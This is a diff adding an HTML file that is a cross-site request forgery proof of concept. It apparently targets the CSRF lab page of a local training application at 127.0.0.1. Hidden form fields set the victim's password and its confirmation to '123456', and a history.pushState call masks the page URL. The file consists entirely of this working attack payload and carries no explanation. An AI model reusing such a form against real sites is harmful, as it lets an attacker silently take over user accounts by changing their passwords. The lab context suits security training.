@@ -1,0 +1,11 @@
+<html>
+<body>
+<script>history.pushState('','','/')</script>
+    <form action="http://127.0.0.1/vulnerabilities/csrf">
+        <input type="hidden" name="password&#95;new" value="123456"/>
+        <input type="hidden" name="password&#95;conf" value="123456"/>
+        <input type="hidden" name="Change" value="Change"/>
+        <input type="submit" value="Submit request"/>
+    </form>
+</body>
+</html>
